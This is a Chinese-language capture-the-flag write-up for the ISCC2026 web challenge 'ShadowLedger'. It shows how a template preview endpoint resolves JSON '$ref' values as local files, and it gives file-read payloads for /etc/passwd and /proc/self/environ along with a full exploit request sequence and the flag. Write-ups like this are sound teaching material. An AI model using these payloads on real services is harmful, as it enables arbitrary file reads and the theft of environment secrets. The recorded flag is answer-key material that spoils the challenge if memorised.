+++
title = "ShadowLedger"
date = "2026-05-14"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

Web + ShadowLedger

解题思路：

这题最开始直接访问 http://39.105.213.28:12606/ 会被误导，真正的应用是挂在同一端口下的虚拟主机里。访问时需要带上正确的 Host: campus-stat.example.com，这样首页才会进入真正的 ShadowLedger 系统。

进入系统后可以看到 /login、/register、/dashboard，同时前端脚本 /static/app.js 暴露了主要接口：/api/register、/api/login、/api/template/preview、/api/user/session。

注册并登录一个普通审计员账号后，请求 /api/user/session，可以看到当前用户可访问的路由中除了 /api/template/preview 之外，还有 /api/template/import。再结合 /templates 页面里的提示：

The preview service resolves nested references for auditors.

可以判断题目的核心点在模板预览服务对嵌套引用的解析逻辑上，重点关注 \$ref。

继续测试发现 /api/template/preview 支持通过 \$ref 解析本地文件。例如提交：

{"schema":{"\$ref":"file:///etc/passwd"}}

服务端会直接返回文件内容，说明这里存在基于 file:// 的任意文件读取。

拿到这个能力后，进一步读取进程环境变量文件 /proc/self/environ：

{"schema":{"\$ref":"file:///proc/self/environ"}}

返回结果中可以直接看到环境变量里的 FLAG，最终得到：

ISCC{black\_box\_schema\_ref\_to\_shadow\_vault\_2026}

Exp：

GET / HTTP/1.1\
Host: campus-stat.example.com

POST /api/register HTTP/1.1\
Host: campus-stat.example.com\
Content-Type: application/json

{"username":"alice123","password":"alice123"}

POST /api/login HTTP/1.1\
Host: campus-stat.example.com\
Content-Type: application/json

{"username":"alice123","password":"alice123"}

POST /api/template/preview HTTP/1.1\
Host: campus-stat.example.com\
Content-Type: application/json\
Cookie: &lt;session&gt;

{"schema":{"\$ref":"file:///proc/self/environ"}}

返回中可见：你服务器炸了搞不到截图

FLAG=ISCC{black\_box\_schema\_ref\_to\_shadow\_vault\_2026}
